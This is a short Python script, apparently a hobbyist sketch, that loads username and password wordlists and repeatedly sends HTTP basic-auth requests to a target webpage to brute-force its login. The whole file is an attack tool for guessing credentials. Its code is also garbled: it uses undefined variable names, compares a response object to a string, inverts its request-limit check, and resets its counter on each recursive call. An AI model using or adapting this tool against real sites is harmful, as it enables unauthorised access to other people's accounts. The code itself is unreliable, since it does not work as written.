#!/bin/python3

import requests
import os
import time


 ##### BRUTE FORCE WEBSITE CREDENTIALS ########################################################
 #
 # NAME: bruteforce https
 # TYPE: Python
 # DATE: 08/12/21
 # purpose:  might possibly be able to brutefoce a website requiring username and password
 #           probably will have issues with no delay between requests, and a whole host of 
 #           other problems.
 #
 # requirements: large password and username list files.
 # NOTES: never tested code on a server, may not work at all just a quick sketch up of an idea
 #        that popped into my head.
 ##############################################################################################


webpage = "" # name of webpage
positive_request = "<Response [200]>" # if password and username match you will get a response of 200
									  # check r to see result

pass_file = "" # name of text file with list of passwords
user_file = "" # name of text file with list of usernames

SET_LIMIT = 20000 # set a limit of how many requests can be made
passwords = [] # list of all passwords from file
usernames = [] # list of all usernames from file
info_list = [pass_file, user_file] # simplifies the FILE_DATA() function: uses one isntead of seperate
								   # for loops


def FILE_DATA(): # converts files with passwords or username for each line into a python list
	try:
		for object in info_list:
			with open(object, 'r') as file:
				for line in file:
					if object == pass_file:
						passwords.append(line)  # passwords list
					else:
						usernames.append(line)	# usernames list
		print(f"[{FILE_DATA.__name__}] password list stored")
	except:
		print(f"[{FILE_DATA.__name__}] Error: could not find password and/or username file")


def REQUEST(): # ask website to login with specific credentials
	count_ = 0 # counts iterations
	try: # trys request to connect with username and password based on iterations
		r = requests.get(webpage)
		if r.ok == False:
			print(f"[{REQUEST.__name__}] issue with address, or connection")
			exit()
		r = requests.get(webpage, auth=(str(username[count_]), str(password[count_])))
		# time.sleep(0.1) # could have issues with sending and receiving to quickly

		if r != positive_request: # 200 is possitive everything else is an error
			count_ += 1
			if count_ <= SET_LIMIT:
				print(f"[{REQUEST.__name__}] Limit Reached {SET_LIMIT}")
				exit()
			REQUEST()

	except:
		print(f"[{REQUEST.__name__}] Error: try: in  'r = request.get()'")

if __name__ == '__main__':
	FILE_DATA()
	REQUEST()
